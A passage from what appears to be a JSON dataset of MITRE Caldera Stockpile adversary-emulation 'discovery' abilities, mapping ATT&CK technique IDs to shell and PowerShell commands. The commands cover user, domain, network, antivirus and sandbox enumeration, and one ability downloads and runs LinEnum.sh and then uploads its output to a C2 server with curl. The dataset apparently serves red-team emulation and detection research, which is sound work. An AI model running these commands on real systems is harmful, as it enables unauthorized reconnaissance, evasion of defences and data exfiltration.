"data/abilities/discovery/29451844-9b76-4e16-a9ee-d6feab4b24db.yml", "command": "$PSVersionTable\n", "name": "Discover the PowerShell version"}, {"source": "data/abilities/discovery/30732a56-4a23-4307-9544-09caf2ed29d5.yml", "command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n", "name": "Discover all directories containing deletable files by user"}, {"source": "data/abilities/discovery/30732a56-4a23-4307-9544-09caf2ed29d5.yml", "command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n", "name": "Discover all directories containing deletable files by user"}, {"source": "data/abilities/discovery/46098c66-8d9a-4d23-8a95-dd5021c385ae.yml", "command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\nchmod +x LinEnum.sh;\n./LinEnum.sh > /tmp/exfil.txt;\ncurl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;\ncat /tmp/exfil.txt;\n", "name": "Download and execute LinEnum.sh"}, {"source": "data/abilities/discovery/b6b105b9-41dc-490b-bc5c-80d699b82ce8.yml", "command": "[environment]::OSVersion.Version\n", "name": "Find OS Version"}], "parsed_datasets": [{"Mitre Stockpile - Discover the PowerShell version": {"id": "29451844-9b76-4e16-a9ee-d6feab4b24db", "name": "PowerShell version", "description": "Discover the PowerShell version", "tactic": "discovery", "technique": {"attack_id": "T1082", "name": "System Information Discovery"}, "platforms": {"windows": {"psh,pwsh": {"command": "$PSVersionTable\n"}}}}}, {"Mitre Stockpile - Discover all directories containing deletable files by user": {"id": "30732a56-4a23-4307-9544-09caf2ed29d5", "name": "Find deletable dirs (per user)", "description": "Discover all directories containing deletable files by user", "tactic": "discovery", "technique": {"attack_id": "T1082", "name": "System Information Discovery"}, "platforms": {"darwin": {"sh": {"command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n"}}, "linux": {"sh": {"command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.user.name"}]}]}}, {"Mitre Stockpile - Download and execute LinEnum.sh": {"id": "46098c66-8d9a-4d23-8a95-dd5021c385ae", "name": "Linux Enumeration & Privilege Escalation Discovery Script", "description": "Download and execute LinEnum.sh", "tactic": "discovery", "technique": {"attack_id": "T1082", "name": "System Information Discovery"}, "platforms": {"linux": {"sh": {"command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\nchmod +x LinEnum.sh;\n./LinEnum.sh > /tmp/exfil.txt;\ncurl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;\ncat /tmp/exfil.txt;\n", "cleanup": "rm ./LinEnum.sh;\nrm /tmp/exfil.txt;\n"}}}}}, {"Mitre Stockpile - Find OS Version": {"id": "b6b105b9-41dc-490b-bc5c-80d699b82ce8", "name": "Find OS Version", "description": "Find OS Version", "tactic": "discovery", "technique": {"attack_id": "T1082", "name": "System Information Discovery"}, "platforms": {"windows": {"psh": {"command": "[environment]::OSVersion.Version\n"}}}}}], "command_list": ["$PSVersionTable", "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;", "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\nchmod +x LinEnum.sh;\n./LinEnum.sh > /tmp/exfil.txt;\ncurl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;\ncat /tmp/exfil.txt;", "[environment]::OSVersion.Version"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1518.001", "commands": [{"source": "data/abilities/discovery/2dece965-37a0-4f70-a391-0f30e3331aba.yml", "command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"\n", "name": "Identify AV"}, {"source": "data/abilities/discovery/2dece965-37a0-4f70-a391-0f30e3331aba.yml", "command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\n", "name": "Identify AV"}], "parsed_datasets": [{"Mitre Stockpile - Identify AV": {"description": "Identify AV", "id": "2dece965-37a0-4f70-a391-0f30e3331aba", "name": "Discover antivirus programs", "platforms": {"darwin": {"sh": {"command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"\n", "parsers": {"plugins.stockpile.app.parsers.antivirus": [{"source": "host.installed.av"}]}}}, "windows": {"psh": {"command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.installed.av"}]}}}}, "tactic": "discovery", "technique": {"attack_id": "T1518.001", "name": "Software Discovery: Security Software Discovery"}}}], "command_list": ["find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"", "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1087.002", "commands": [{"source": "data/abilities/discovery/364ea817-bbb9-4083-87dd-94b9dba45f6f.yml", "command": "net user #{domain.user.name} /domain", "name": "The net utility is executed via cmd to enumerate detailed information about a specific user account."}], "parsed_datasets": [{"Mitre Stockpile - The net utility is executed via cmd to enumerate detailed information about a specific user account.": {"id": "364ea817-bbb9-4083-87dd-94b9dba45f6f", "name": "Account Discovery (targeted)", "description": "The net utility is executed via cmd to enumerate detailed information about a specific user account.", "tactic": "discovery", "technique": {"attack_id": "T1087.002", "name": "Account Discovery: Domain Account"}, "platforms": {"windows": {"cmd,psh": {"command": "net user #{domain.user.name} /domain"}}}}}], "command_list": ["net user #{domain.user.name} /domain"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1046", "commands": [{"source": "data/abilities/discovery/3a2ce3d5-e9e2-4344-ae23-470432ff8687.yml", "command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n", "name": "Uses nmap to fingerprint services that were network accessible"}, {"source": "data/abilities/discovery/3a2ce3d5-e9e2-4344-ae23-470432ff8687.yml", "command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n", "name": "Uses nmap to fingerprint services that were network accessible"}, {"source": "data/abilities/discovery/47abe1f5-55a5-46cc-8cad-506dac8ea6d9.yml", "command": "python3 scanner.py -i #{remote.host.ip}\n", "name": "Use dropped scanner to find open popular ports"}, {"source": "data/abilities/discovery/47abe1f5-55a5-46cc-8cad-506dac8ea6d9.yml", "command": "python3 scanner.py -i #{remote.host.ip}\n", "name": "Use dropped scanner to find open popular ports"}, {"source": "data/abilities/discovery/5a4cb2be-2684-4801-9355-3a90c91e0004.yml", "command": "Import-Module ./basic_scanner.ps1;\n$ports = @(22, 53, 80, 445);\nGet-NetIPConfiguration | ?{$_.NetAdapter.Status -ne \"Disconnected\"} | Get-NetIPaddress -AddressFamily IPv4 | %{\n    $ipv4 = $_.IPAddress;\n    $prefixLength = $_.PrefixLength;\n    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;\n};\n", "name": "Scans the local network for common open ports"}], "parsed_datasets": [{"Mitre Stockpile - Uses nmap to fingerprint services that were network accessible": {"id": "3a2ce3d5-e9e2-4344-ae23-470432ff8687", "name": "Fingerprint network services", "description": "Uses nmap to fingerprint services that were network accessible", "tactic": "discovery", "technique": {"attack_id": "T1046", "name": "Network Service Scanning"}, "platforms": {"darwin": {"sh": {"command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n"}}, "linux": {"sh": {"command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n"}}}}}, {"Mitre Stockpile - Use dropped scanner to find open popular ports": {"id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9", "name": "Scan IP for ports", "description": "Use dropped scanner to find open popular ports", "tactic": "discovery", "technique": {"attack_id": "T1046", "name": "Network Service Scanning"}, "platforms": {"darwin": {"sh": {"command": "python3 scanner.py -i #{remote.host.ip}\n", "parsers": {"plugins.stockpile.app.parsers.scan": [{"source": "remote.host.ip", "edge": "has_open_port", "target": "remote.host.port"}]}, "payloads": ["scanner.py"]}}, "linux": {"sh": {"command": "python3 scanner.py -i #{remote.host.ip}\n", "parsers": {"plugins.stockpile.app.parsers.scan": [{"source": "remote.host.ip", "edge": "has_open_port", "target": "remote.host.port"}]}, "payloads": ["scanner.py"]}}}}}, {"Mitre Stockpile - Scans the local network for common open ports": {"id": "5a4cb2be-2684-4801-9355-3a90c91e0004", "name": "Network Service Scanning", "description": "Scans the local network for common open ports", "tactic": "discovery", "technique": {"attack_id": "T1046", "name": "Network Service Scanning"}, "platforms": {"windows": {"psh": {"command": "Import-Module ./basic_scanner.ps1;\n$ports = @(22, 53, 80, 445);\nGet-NetIPConfiguration | ?{$_.NetAdapter.Status -ne \"Disconnected\"} | Get-NetIPaddress -AddressFamily IPv4 | %{\n    $ipv4 = $_.IPAddress;\n    $prefixLength = $_.PrefixLength;\n    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;\n};\n", "payloads": ["basic_scanner.ps1"], "timeout": 180}}}}}], "command_list": ["nmap -sV -p #{remote.host.port} #{remote.host.ip}", "python3 scanner.py -i #{remote.host.ip}", "Import-Module ./basic_scanner.ps1;\n$ports = @(22, 53, 80, 445);\nGet-NetIPConfiguration | ?{$_.NetAdapter.Status -ne \"Disconnected\"} | Get-NetIPaddress -AddressFamily IPv4 | %{\n    $ipv4 = $_.IPAddress;\n    $prefixLength = $_.PrefixLength;\n    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;\n};"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1135", "commands": [{"source": "data/abilities/discovery/530e47c6-8592-42bf-91df-c59ffbd8541b.yml", "command": "Get-SmbShare | ConvertTo-Json", "name": "Network Share Discovery"}, {"source": "data/abilities/discovery/deeac480-5c2a-42b5-90bb-41675ee53c7e.yml", "command": "net view \\\\#{remote.host.fqdn} /all", "name": "View the shares of a remote host"}, {"source": "data/abilities/discovery/deeac480-5c2a-42b5-90bb-41675ee53c7e.yml", "command": "net view \\\\#{remote.host.fqdn} /all", "name": "View the shares of a remote host"}], "parsed_datasets": [{"Mitre Stockpile - Network Share Discovery": {"id": "530e47c6-8592-42bf-91df-c59ffbd8541b", "name": "View admin shares", "description": "Network Share Discovery", "tactic": "discovery", "technique": {"attack_id": "T1135", "name": "Network Share Discovery"}, "platforms": {"windows": {"pwsh,psh": {"command": "Get-SmbShare | ConvertTo-Json", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.smb.share", "custom_parser_vals": {"json_key": "Path", "json_type": "str"}}]}}}}}}, {"Mitre Stockpile - View the shares of a remote host": {"id": "deeac480-5c2a-42b5-90bb-41675ee53c7e", "name": "View remote shares", "description": "View the shares of a remote host", "tactic": "discovery", "technique": {"attack_id": "T1135", "name": "Network Share Discovery"}, "platforms": {"windows": {"psh": {"command": "net view \\\\#{remote.host.fqdn} /all", "parsers": {"plugins.stockpile.app.parsers.net_view": [{"source": "remote.host.fqdn", "edge": "has_share", "target": "remote.host.share"}]}}, "cmd": {"command": "net view \\\\#{remote.host.fqdn} /all", "parsers": {"plugins.stockpile.app.parsers.net_view": [{"source": "remote.host.fqdn", "edge": "has_share", "target": "remote.host.share"}]}}}}}}], "command_list": ["Get-SmbShare | ConvertTo-Json", "net view \\\\#{remote.host.fqdn} /all"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1069.001", "commands": [{"source": "data/abilities/discovery/5c4dd985-89e3-4590-9b57-71fed66ff4e2.yml", "command": "gpresult /R\n", "name": "Summary of permission and security groups"}, {"source": "data/abilities/discovery/5c4dd985-89e3-4590-9b57-71fed66ff4e2.yml", "command": "groups", "name": "Summary of permission and security groups"}, {"source": "data/abilities/discovery/5c4dd985-89e3-4590-9b57-71fed66ff4e2.yml", "command": "groups", "name": "Summary of permission and security groups"}], "parsed_datasets": [{"Mitre Stockpile - Summary of permission and security groups": {"id": "5c4dd985-89e3-4590-9b57-71fed66ff4e2", "name": "Permission Groups Discovery", "description": "Summary of permission and security groups", "tactic": "discovery", "technique": {"attack_id": "T1069.001", "name": "Permission Groups Discovery: Local Groups"}, "platforms": {"windows": {"psh": {"command": "gpresult /R\n"}}, "darwin": {"sh": {"command": "groups"}}, "linux": {"sh": {"command": "groups"}}}}}], "command_list": ["gpresult /R", "groups"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1010", "commands": [{"source": "data/abilities/discovery/5c65eec8-4839-4713-a4e1-86b2e75d1927.yml", "command": "$x = Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object MainWindowTitle;\n$a = New-Object -com \"Shell.Application\"; $b = $a.windows() | select-object LocationName;\nwrite-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)", "name": "Extracts the names of all open non-explorer windows, and the locations of all explorer windows."}], "parsed_datasets": [{"Mitre Stockpile - Extracts the names of all open non-explorer windows, and the locations of all explorer windows.": {"id": "5c65eec8-4839-4713-a4e1-86b2e75d1927", "name": "Application Window Discovery", "description": "Extracts the names of all open non-explorer windows, and the locations of all explorer windows.", "tactic": "discovery", "technique": {"attack_id": "T1010", "name": "Application Window Discovery"}, "platforms": {"windows": {"psh": {"command": "$x = Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object MainWindowTitle;\n$a = New-Object -com \"Shell.Application\"; $b = $a.windows() | select-object LocationName;\nwrite-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)"}}}}}], "command_list": ["$x = Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object MainWindowTitle;\n$a = New-Object -com \"Shell.Application\"; $b = $a.windows() | select-object LocationName;\nwrite-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1497.001", "commands": [{"source": "data/abilities/discovery/5dc841fd-28ad-40e2-b10e-fb007fe09e81.yml", "command": "get-wmiobject win32_computersystem | fl model\n", "name": "Determine if the system is virtualized or physical"}], "parsed_datasets": [{"Mitre Stockpile - Determine if the system is virtualized or physical": {"id": "5dc841fd-28ad-40e2-b10e-fb007fe09e81", "name": "Virtual or Real", "description": "Determine if the system is virtualized or physical", "tactic": "discovery", "technique": {"attack_id": "T1497.001", "name": "Virtualization/Sandbox Evasion: System Checks"}, "platforms": {"windows": {"psh": {"command": "get-wmiobject win32_computersystem | fl model\n"}}}}}], "command_list": ["get-wmiobject win32_computersystem | fl model"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1482", "commands": [{"source": "data/abilities/discovery/6131397e-7765-424e-a594-3d7fb2d93a6a.yml", "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetDomain | ConvertTo-Json -Depth 1\n", "name": "Determine the Windows Domain of a computer"}], "parsed_datasets": [{"Mitre Stockpile - Determine the Windows Domain of a computer": {"id": "6131397e-7765-424e-a594-3d7fb2d93a6a", "name": "GetDomain", "description": "Determine the Windows Domain of a computer", "tactic": "discovery", "technique": {"attack_id": "T1482", "name": "Domain Trust Discovery"}, "platforms": {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetDomain | ConvertTo-Json -Depth 1\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.ad.forest", "custom_parser_vals": {"json_key": "Forest", "json_type": "str"}}, {"source": "domain.ad.name", "custom_parser_vals": {"json_key": "Name", "json_type": "str"}}]}, "payloads": ["powerview.ps1"]}}}}}], "command_list": ["Import-Module .\\powerview.ps1 -Force;\nGet-NetDomain | ConvertTo-Json -Depth 1"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1049", "commands": [{"source": "data/abilities/discovery/613e0ffb-e6e8-4e86-b35d-10edd232679d.yml", "command": "netstat -ano;\nGet-NetTCPConnection", "name": "Enumerates network connections"}, {"source": "data/abilities/discovery/638fb6bb-ba39-4285-93d1-7e4775b033a8.yml", "command": "netstat -ant\n", "name": "Find System Network Connections"}, {"source": "data/abilities/discovery/638fb6bb-ba39-4285-93d1-7e4775b033a8.yml", "command": "netstat -ant\n", "name": "Find System Network Connections"}, {"source": "data/abilities/discovery/638fb6bb-ba39-4285-93d1-7e4775b033a8.yml", "command": "Get-NetTCPConnection\n", "name": "Find System Network Connections"}], "parsed_datasets": [{"Mitre Stockpile - Enumerates network connections": {"id": "613e0ffb-e6e8-4e86-b35d-10edd232679d", "name": "System Network Connections Discovery", "description": "Enumerates network connections", "tactic": "discovery", "technique": {"attack_id": "T1049", "name": "System Network Connections Discovery"}, "platforms": {"windows": {"psh": {"command": "netstat -ano;\nGet-NetTCPConnection"}}}}}, {"Mitre Stockpile - Find System Network Connections": {"id": "638fb6bb-ba39-4285-93d1-7e4775b033a8", "name": "Find System Network Connections", "description": "Find System Network Connections", "tactic": "discovery", "technique": {"attack_id": "T1049", "name": "System Network Connections Discovery"}, "platforms": {"darwin": {"sh": {"command": "netstat -ant\n"}}, "linux": {"sh": {"command": "netstat -ant\n"}}, "windows": {"psh": {"command": "Get-NetTCPConnection\n"}}}}}], "command_list": ["netstat -ano;\nGet-NetTCPConnection", "netstat -ant", "Get-NetTCPConnection"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1518.001", "commands": [{"source": "data/abilities/discovery/7c42a30c-c8c7-44c5-80a8-862d364ac1e4.yml", "command": "echo $(get-uac)\n", "name": "Determine whether or not UAC is enabled"}], "parsed_datasets": [{"Mitre Stockpile - Determine whether or not UAC is enabled": {"id": "7c42a30c-c8c7-44c5-80a8-862d364ac1e4", "name": "UAC Status", "description": "Determine whether or not UAC is enabled", "tactic": "discovery", "technique": {"attack_id": "T1518.001", "name": "Software Discovery: Security Software Discovery"}, "platforms": {"windows": {"psh,pwsh": {"command": "echo $(get-uac)\n"}}}}}], "command_list": ["echo $(get-uac)"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1518", "commands": [{"source": "data/abilities/discovery/830bb6ed-9594-4817-b1a1-c298c0f9f425.yml", "command": "which google-chrome\n", "name": "Check to see if Gooogle Chrome browser is installed"}, {"source": "data/abilities/discovery/830bb6ed-9594-4817-b1a1-c298c0f9f425.yml", "command": "which google-chrome\n", "name": "Check to see if Gooogle Chrome browser is installed"}, {"source": "data/abilities/discovery/9849d956-37ea-49f2-a8b5-f2ca080b315d.yml", "command": "which go\n", "name": "Check to see if GoLang is installed"}, {"source": "data/abilities/discovery/9849d956-37ea-49f2-a8b5-f2ca080b315d.yml", "command": "which go\n", "name": "Check to see if GoLang is installed"}, {"source": "data/abilities/discovery/b18e8767-b7ea-41a3-8e80-baf65a5ddef5.yml", "command": "python3 --version\n", "name": "Check to see what version of python is installed"}, {"source": "data/abilities/discovery/b18e8767-b7ea-41a3-8e80-baf65a5ddef5.yml", "command": "python3 --version\n", "name": "Check to see what version of python is installed"}, {"source": "data/abilities/discovery/c9be8043-a445-4cbf-b77b-ed7bb007fc7c.yml", "command": "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version\n", "name": "Determine the version of Internet Explorer running"}], "parsed_datasets": [{"Mitre Stockpile - Check to see if Gooogle Chrome browser is installed": {"id": "830bb6ed-9594-4817-b1a1-c298c0f9f425", "name": "Check Chrome", "description": "Check to see if Gooogle Chrome browser is installed", "tactic": "discovery", "technique": {"attack_id": "T1518", "name": "Software Discovery"}, "platforms": {"darwin": {"sh": {"command": "which google-chrome\n"}}, "linux": {"sh": {"command": "which google-chrome\n"}}}}}, {"Mitre Stockpile - Check to see if GoLang is installed": {"id": "9849d956-37ea-49f2-a8b5-f2ca080b315d", "name": "Check Go", "description": "Check to see if GoLang is installed", "tactic": "discovery", "technique": {"attack_id": "T1518", "name": "Software Discovery"}, "platforms": {"darwin": {"sh": {"command": "which go\n"}}, "linux": {"sh": {"command": "which go\n"}}}}}, {"Mitre Stockpile - Check to see what version of python is installed": {"id": "b18e8767-b7ea-41a3-8e80-baf65a5ddef5", "name": "Check Python", "description": "Check to see what version of python is installed", "tactic": "discovery", "technique": {"attack_id": "T1518", "name": "Software Discovery"}, "platforms": {"darwin": {"sh": {"command": "python3 --version\n"}}, "linux": {"sh": {"command": "python3 --version\n"}}}}}, {"Mitre Stockpile - Determine the version of Internet Explorer running": {"id": "c9be8043-a445-4cbf-b77b-ed7bb007fc7c", "name": "Internet Explorer Version", "description": "Determine the version of Internet Explorer running", "tactic": "discovery", "technique": {"attack_id": "T1518", "name": "Software Discovery"}, "platforms": {"windows": {"psh": {"command": "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version\n"}}}}}], "command_list": ["which google-chrome", "which go", "python3 --version", "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1518.001", "commands": [{"source": "data/abilities/discovery/8c06ebf8-bacf-486b-bd77-21ba8c5a5777.yml", "command": "$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;\n", "name": "Identify Firewalls"}], "parsed_datasets": [{"Mitre Stockpile - Identify Firewalls": {"id": "8c06ebf8-bacf-486b-bd77-21ba8c5a5777", "name": "Identify Firewalls", "description": "Identify Firewalls", "tactic": "discovery", "technique": {"attack_id": "T1518.001", "name": "Software Discovery: Security Software Discovery"}, "platforms": {"windows": {"psh": {"command": "$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;\n"}}}}}], "command_list": ["$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1120", "commands": [{"source": "data/abilities/discovery/9b007f62-daa1-44bd-a57d-00c5315ec6fe.yml", "command": "system_profiler SPUSBDataType\n", "name": "find attached usb devices"}], "parsed_datasets": [{"Mitre Stockpile - find attached usb devices": {"id": "9b007f62-daa1-44bd-a57d-00c5315ec6fe", "name": "USB Connected Device Discovery", "description": "find attached usb devices", "tactic": "discovery", "technique": {"attack_id": "T1120", "name": "Peripheral Device Discovery"}, "platforms": {"darwin": {"sh": {"command": "system_profiler SPUSBDataType\n"}}}}}], "command_list": ["system_profiler SPUSBDataType"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1033", "commands": [{"source": "data/abilities/discovery/aaf34d82-aea9-4278-8ec4-789653e4f5d9.yml", "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n", "name": "Get Administrator users for a computer"}, {"source": "data/abilities/discovery/bd527b63-9f9e-46e0-9816-b8434d2b8989.yml", "command": "whoami\n", "name": "Obtain user from current session"}, {"source": "data/abilities/discovery/bd527b63-9f9e-46e0-9816-b8434d2b8989.yml", "command": "whoami\n", "name": "Obtain user from current session"}, {"source": "data/abilities/discovery/bd527b63-9f9e-46e0-9816-b8434d2b8989.yml", "command": "whoami\n", "name": "Obtain user from current session"}, {"source": "data/abilities/discovery/c0da588f-79f0-4263-8998-7496b1a40596.yml", "command": "whoami", "name": "Find user running agent"}, {"source": "data/abilities/discovery/c0da588f-79f0-4263-8998-7496b1a40596.yml", "command": "whoami", "name": "Find user running agent"}, {"source": "data/abilities/discovery/c0da588f-79f0-4263-8998-7496b1a40596.yml", "command": "$env:username\n", "name": "Find user running agent"}, {"source": "data/abilities/discovery/c0da588f-79f0-4263-8998-7496b1a40596.yml", "command": "echo %username%", "name": "Find user running agent"}, {"source": "data/abilities/discovery/f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c.yml", "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n", "name": "Get Service Accounts for a domain"}], "parsed_datasets": [{"Mitre Stockpile - Get Administrator users for a computer": {"id": "aaf34d82-aea9-4278-8ec4-789653e4f5d9", "name": "GetAdminMembers", "description": "Get Administrator users for a computer", "tactic": "discovery", "technique": {"attack_id": "T1033", "name": "System Owner/User Discovery"}, "platforms": {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.user.name", "custom_parser_vals": {"json_key": "samaccountname", "json_type": "str"}}]}, "payloads": ["powerview.ps1"]}}}}}, {"Mitre Stockpile - Obtain user from current session": {"id": "bd527b63-9f9e-46e0-9816-b8434d2b8989", "name": "Current User", "description": "Obtain user from current session", "tactic": "discovery", "technique": {"attack_id": "T1033", "name": "System Owner/User Discovery"}, "platforms": {"darwin": {"sh": {"command": "whoami\n"}}, "linux": {"sh": {"command": "whoami\n"}}, "windows": {"psh": {"command": "whoami\n"}}}}}, {"Mitre Stockpile - Find user running agent": {"id": "c0da588f-79f0-4263-8998-7496b1a40596", "name": "Identify active user", "description": "Find user running agent", "tactic": "discovery", "technique": {"attack_id": "T1033", "name": "System Owner/User Discovery"}, "platforms": {"darwin": {"sh": {"command": "whoami", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}, "linux": {"sh": {"command": "whoami", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}, "windows": {"psh": {"command": "$env:username\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}, "cmd": {"command": "echo %username%", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}}}}, {"Mitre Stockpile - Get Service Accounts for a domain": {"id": "f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c", "name": "GetServiceAccounts", "description": "Get Service Accounts for a domain", "tactic": "discovery", "technique": {"attack_id": "T1033", "name": "System Owner/User Discovery"}, "platforms": {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.user.name", "custom_parser_vals": {"json_key": "samaccountname", "json_type": "str"}}]}, "payloads": ["powerview.ps1"]}}}}}], "command_list": ["Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1", "whoami", "$env:username", "echo %username%", "whoami", "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1217", "commands": [{"source": "data/abilities/discovery/b007fc38-9eb7-4320-92b3-9a3ad3e6ec25.yml", "command": "cat ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks\n", "name": "Get Chrome Bookmarks"}], "parsed_datasets": [{"Mitre Stockpile - Get Chrome Bookmarks": {"id": "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25", "name": "Get Chrome Bookmarks", "description": "Get Chrome Bookmarks", "tactic": "discovery", "technique": {"attack_id": "T1217", "name": "Browser Bookmark Discovery"}, "platforms": {"darwin": {"sh": {"command": "cat ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks\n", "parsers": {"plugins.stockpile.app.parsers.bookmarks": [{"source": "host.chrome.bookmark_title", "edge": "resolves_to", "target": "host.chrome.bookmark_url"}]}}}}}}], "command_list": ["cat ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1087.001", "commands": [{"source": "data/abilities/discovery/c1cd6388-3ced-48c7-a511-0434c6ba8f48.yml", "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n", "name": "Get a list of all local users"}, {"source": "data/abilities/discovery/c1cd6388-3ced-48c7-a511-0434c6ba8f48.yml", "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n", "name": "Get a list of all local users"}], "parsed_datasets": [{"Mitre Stockpile - Get a list of all local users": {"id": "c1cd6388-3ced-48c7-a511-0434c6ba8f48", "name": "Find local users", "description": "Get a list of all local 